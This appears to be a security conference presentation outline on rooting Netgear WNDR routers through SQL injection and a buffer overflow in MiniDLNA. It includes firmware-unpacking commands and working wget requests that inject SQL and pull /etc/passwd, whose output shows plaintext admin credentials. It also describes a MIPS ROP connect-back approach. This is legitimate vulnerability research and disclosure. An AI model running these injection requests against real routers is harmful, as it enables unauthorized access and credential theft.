# From SQL Injection to MIPS Overflows: Rooting SOHO Routers

## Presenter
- **Zachary Cutlip, Tactical Network Solutions**
- **Craig Heffner**

## Acknowledgements
- Special thanks to Craig Heffner for his contributions and insights.

## Overview
- Novel uses of SQL injection
- Buffer overflows on MIPS architecture
- 0-day vulnerabilities in Netgear routers
- Embedded device investigation process
- Live demo: Root shell and more
- Questions and further reading

## Why Attack SOHO Routers?
- Provides attackers with a privileged vantage point.
- Exposes multiple connected users to potential attacks.
- Allows for snooping and manipulation of all users' internet communications.
- Often serves as an unauthorized entry point into enterprise networks.

## Target Device
- **Netgear WNDR3700 v3**: A popular, feature-rich SOHO wireless router.
- **Other Affected Devices**:
  - Netgear WNDR3800
  - Netgear WNDR4000
  - Netgear WNDR4400

## Initial Steps
1. **Physical Disassembly**:
   - Locate the UART header.
   - Use a UART to USB adapter for analysis.
   - Connect to the USB port to facilitate debugging and data retrieval.

2. **Software Analysis**:
   - Download and unpack the firmware update from the vendor.
   - Refer to Craig Heffnerâ€™s blog for detailed instructions on firmware unpacking: [http://www.devttys0.com/blog](http://www.devttys0.com/blog)
   - Identify the Linux environment and extract the filesystem.
   - Example command:
     ```bash
     $ binwalk ./WNDR3700v3-V1.0.0.18_1.0.14.chk
     DECIMAL    HEX        DESCRIPTION
     ---------------------------------------------------
     86         0x56      LZMA compressed data
     1423782    0x15B9A6  Squashfs filesystem
     $ dd if=WNDR3700v3-V1.0.0.18_1.0.14.chk of=kernel.7z bs=1 skip=86 count=1423696
     $ p7zip -d kernel.7z
     $ strings kernel | grep 'Linux version'
     Linux version 2.6.22 (peter@localhost.localdomain) (gcc version 4.2.3) #1 Wed Sep 14 10:38:51 CST 2011
     ```

## Target Application: MiniDLNA
- **DLNA (Digital Living Network Alliance)**: Facilitates interoperability between gadgets for multimedia playback.
- **Attack Surface**: MiniDLNA is open-source, allowing for source code analysis.
- **Version Information**: The shipping binary is version 1.0.18.

### Vulnerabilities
1. **SQL Injection**:
   - **Impact**: Privileged access to data, even if not sensitive.
   - **Exploitation**: Violate developer assumptions by injecting malicious SQL.
   - **Example**:
     ```bash
     $ wget http://10.10.10.1:8200/AlbumArt/"1; INSERT/**/into/**/ALBUM_ART(ID,PATH)/**/VALUES('31337','pwned');"throwaway.jpg
     sqlite> select * from ALBUM_ART where ID=31337;
     31337|pwned
     ```
   - **Outcome**: Successfully injected and verified.

2. **Remote File Extraction**:
   - **Impact**: Extract sensitive files such as `/etc/passwd`.
   - **Exploitation**:
     ```bash
     $ wget http://10.10.10.1:8200/AlbumArt/"1;INSERT/**/into/**/ALBUM_ART(ID,PATH)/**/VALUES('31337','/etc/passwd');"throwaway.jpg
     $ wget http://10.10.10.1:8200/AlbumArt/31337-18.jpg
     $ cat 31337-18.jpg
     nobody:*:0:0:nobody:/:/bin/sh
     admin:qw12QW!@:0:0:admin:/:/bin/sh
     guest:guest:0:0:guest:/:/bin/sh
     admin:qw12QW!@:0:0:admin:/:/bin/sh
     ```

3. **Remote Code Execution (RCE)**:
   - **Impact**: Gain root access.
   - **Exploitation**:
     - Use `sprintf`, `strcat`, and `strcpy` to identify potential buffer overflows.
     - Exploit type affinity and weak validation to inject shellcode.
     - Trigger the exploit using a SOAP request.
   - **Challenges**:
     - Limited length of SQL injection (approx. 128 bytes per pass).
     - Stack ASLR and MIPS architecture idiosyncrasies.
   - **Advantages**:
     - No ASLR for executable, heap, and libraries.
     - Executable stack.
     - ROP on MIPS.
   - **Payload Construction**:
     - Use inert instructions and avoid bad characters.
     - Write a custom NUL-safe connect-back payload.
   - **Demo**: Live demonstration of the exploit.

## Recommendations
- **Establish Security Requirements**:
  - Self-protection mechanisms.
  - Network protection.
  - Better programming practices.
- **Use Secure Functions**:
  - `sqlite3_snprintf()`
- **Privilege Separation**:
  - Implement mandatory access controls like SELinux.

## Conclusion
- Developer assumptions about well-formed data can be exploited.
- Even low-value databases can be used to compromise system integrity.
- For more details, read the full paper.

## Contact Information
- **Twitter**: @zcutlip
- **Email**: [PI:EMAIL]

## Questions
- Open for any questions or further discussion.